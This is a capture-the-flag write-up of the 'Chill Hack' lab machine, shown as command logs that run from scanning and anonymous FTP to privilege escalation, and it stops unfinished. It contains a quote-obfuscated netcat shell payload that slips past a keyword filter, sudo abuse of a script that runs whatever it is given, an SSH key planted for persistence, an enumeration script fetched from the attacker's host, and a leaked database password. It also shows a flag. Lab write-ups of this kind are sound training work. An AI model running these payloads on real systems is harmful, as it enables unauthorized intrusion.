# Chill Hack
### 

Target machine IP: 10.80.129.48<br>
Attack machine IP: 192.168.136.34

Like always, contents of snippets is cut down for brevity. Shown content is not modified.
```
└─# nmap -sS 10.80.129.48 -p- -vv -n
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```
└─# nmap -sC -sV -O 10.80.129.48 -p21,22,80 -vv -n
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Game Info
|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
```

```
└─# ftp 10.80.129.48 21
Connected to 10.80.129.48.
220 (vsFTPd 3.0.5)
Name (10.80.129.48:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.

ftp> ls
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> 
```

```
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||65000|)
150 Opening BINARY mode data connection for note.txt (90 bytes).
100% |**********************************************************************************|    90        0.80 KiB/s    00:00 ETA
226 Transfer complete.
90 bytes received in 00:00 (0.59 KiB/s)
ftp> exit
221 Goodbye.
```

```
└─$ cat note.txt    
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

```
└─$ gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url 10.80.129.48 -x php,html,txt
...
secret               (Status: 301) [Size: 313] [--> http://10.80.129.48/secret/]
```

We can execute commands here!
I tried executing `ls` but it returns 'Alert Are you a hacker?'. So it's blocked. `whoami` works, however.

```
command: whoami
response: www-data
```
Next I went for `sudo -l`. An interesting response was returned:
```
command: sudo -l
response: Matching Defaults entries for www-data on ip-10-80-129-48: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User www-data may run the following commands on ip-10-80-129-48: (apaar : ALL) NOPASSWD: /home/apaar/.helpline.s
```
So there's a user named `apaar`

Since `cat`, `ls` and `less` commands are blocked ("Are you a hacker" is returned) I went for the unconventional way: let's use grep!
```
command: grep
response: 
index.php: background-image: url('images/FailingMiserableEwe-size_restricted.gif');
index.php: background-image: url('images/blue_boy_typing_nothought.gif'); 
```
Okay, so that are the gifs that play in the background. Now we know for sure that we're dealing with a .php file.


>PS: Directory/Path Traversal doesn't work :'(

Half an hour later... 

Commands for reverse shell do not work: `nc`, `python`, `php`, etc..<br>
So I thought of ways to enumerate system users:
```
command: getent group
response (partial):
aurick:x:1000:
apaar:x:1001:
anurodh:x:1002
```
That's alright, but we don't go any further. 

**Obfuscation is the key.**

I did some testing, and found out that commands are blocked based on keywords. If there's a `python`, `nc` or even `ls` keyword, it'll fail. <br>
There are several ways to break the filtering. Most obvious ones are using `'` signs and a backslash `\` sign.

This way we can execute any command we want!
```
command: l's'
response: images index.php

command: l\s
response: images index.php
```
>Filtering evasion is quite the rabbithole, and I'd love to dive into it soon!

I've opened up my trustworthy reverse shells and obfuscated one of them:
```
command: mk'fif'o /tmp/f; 'n'c -lv'n'p 5217 < /t'm'p/f | /'b'in/'s'h >/t'm'p/f 2>&1; 'r'm /t'm'p/f
```
Response: It hanged! Meaning it's listening for incoming connections.

```
└─$ nc -nv 10.80.129.48 5217
(UNKNOWN) [10.80.129.48] 5217 (?) open
whoami
www-data
```
We have a very simple, unstable session here. We need to upgrade it. 
Python is available, now it's a walk in a park.<br>
```
python3 --version
Python 3.8.10
python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@ip-10-80-129-48:/var/www/html/secret$ 
```
>I've used -c parameter to execute python commands directly from the command line

So what now? We still don't have access to user profiles!
```
www-data@ip-10-82-186-223:/home/apaar$ sudo -l
sudo -l
Matching Defaults entries for www-data on ip-10-82-186-223:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-82-186-223:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```
Ooooh.. So we can run a shell script with sudo rights? 

What's inside?
```
www-data@ip-10-82-186-223:/home/apaar$ cat /home/apaar/.helpline.sh
cat /home/apaar/.helpline.sh
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"
```
Command execution vulnerability
```
www-data@ip-10-82-186-223:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
<html/secret$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: test
test
Hello user! I am test,  Please enter your message: /bin/bash
/bin/bash
whoami
whoami
apaar
```

```
apaar@ip-10-82-186-223:~$ cat /home/apaar/local.txt
cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```
We need to somehow login into apaar ssh.
```
└─# ssh-keygen -f apaar
Generating public/private ed25519 key pair.
Enter passphrase for "apaar" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in apaar
Your public key has been saved in apaar.pub
The key fingerprint is:
SHA256:0TAXF5pv43c3HgXVlzUBVtcra5e/qC/udH//RzDG6oY root@kali
The key's randomart image is:
+--[ED25519 256]--+
|        o o.o+o+X|
|         = +.  o*|
|        . +  .. o|
|         . . .=o |
|        S   +oooo|
|           o.+ oo|
|           +o.o++|
|          E.+.+.B|
|          o=+o +O|
+----[SHA256]-----+
```
```
apaar@ip-10-82-186-223:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGpVCB2MhtgWdhDHf8izVo9fAjkoRWY6Fu8uobrqtPAE root@kali" > authorized_keys
apaar@ip-10-82-186-223:~/.ssh$ <9fAjkoRWY6Fu8uobrqtPAE root@kali" > authorized_keys
```
In other terminal
```
└─# ssh -i apaar apaar@10.82.186.223
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'apaar':
Last login: Sat Jan 24 12:34:13 2026 from 192.168.136.34
apaar@ip-10-82-186-223:~$ 
```
```
└─# wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
└─# python3 -m http.server 5217
Serving HTTP on 0.0.0.0 port 5217 (http://0.0.0.0:5217/) ...
```
```
apaar@ip-10-82-186-223:/tmp$ wget http://192.168.136.34:5217/linpeas.sh
--2026-01-24 12:40:22--  http://192.168.136.34:5217/linpeas.sh
Connecting to 192.168.136.34:5217... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1007100 (983K) [application/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh                      100%[======================================================>] 983.50K  2.90MB/s    in 0.3s    

2026-01-24 12:40:22 (2.90 MB/s) - ‘linpeas.sh’ saved [1007100/1007100]
```
There are two ports that nmap didn't show us:
```
3306 mysql
9001 http
```
Interestingly, there's a password for the mysql in index.php:
```
apaar@ip-10-82-186-223:/var/www/files$ cat index.php
...
$con = new PDO("mysql:dbname=webportal;host=localhost","root","!@m+her00+@db");
```
Next we'll gonna break into mssql server..

zmienic IP od polowy writeupu bo zmienilem maszyne.

